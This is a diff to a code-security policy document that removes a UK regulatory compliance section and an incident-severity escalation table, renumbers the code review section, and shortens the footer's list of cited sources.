-5. **AML Data Protection**: All AML/KYC data must be encrypted at rest and protected from unauthorized access (MLR 2017 Regulation 21/27).
-6. **FCA Registration**: Maintain FCA cryptoasset registration and report material security incidents (FSMA 2000 Part 4A).
-7. **Audit Trail**: All access to sensitive data must be logged with timestamps, user identifiers, and action types (UK GDPR Art. 30, DPA 2018).
-8. **Risk Assessment**: Annual security risk assessments must be conducted and retained for 5 years (MLR 2017 Regulation 27).
-
-### 10.5 UK Enforcement and Escalation
-
-| Severity | Breach Type | Internal SLA | Regulatory Notification |
-|----------|------------|--------------|------------------------|
-| Critical | SSRF exploitation, wallet key compromise | Immediate containment; 4-hour incident response | ICO within 72 hours; FCA if systemic; NCA if criminal |
-| High | Path traversal to AML/KYC data, SQL injection data exfiltration | 24-hour containment; 48-hour remediation | ICO within 72 hours; FCA if crypto services affected |
-| Medium | Cryptographic weakness exploitation (padding oracle, key recovery) | 72-hour containment; 14-day remediation | ICO if personal data affected |
-| Low | Static IV discovery, reconnaissance | 30-day remediation | Document in annual risk assessment |
-
----
-
-## 11. Code Review Policy
+## 9. Code Review Policy
 
 ### 11.1 Review Requirements
 
@@ -896,4 +513,4 @@ Verification: `grep -rn "TODO\|FIXME\|HACK\|XXX" src/` returns no matches. The t
 
 ---
 
-*This policy covers 80 CodeQL-identified vulnerabilities across 7 categories. All have been remediated with defense-in-depth validation. The 80 remaining CodeQL alerts are false positives resulting from taint tracking that does not recognize custom validation methods; justification for each category is documented in Section 6. Financial exposure estimates are based on IBM/Ponemon 2024, NIST SP 800-53 Rev. 5, GDPR Article 32, and CCPA §1798.150.*
+*This policy covers 80 CodeQL-identified vulnerabilities across 7 categories. All have been remediated with defense-in-depth validation. The 80 remaining CodeQL alerts are false positives resulting from taint tracking that does not recognize custom validation methods; justification for each category is documented in Section 6.*
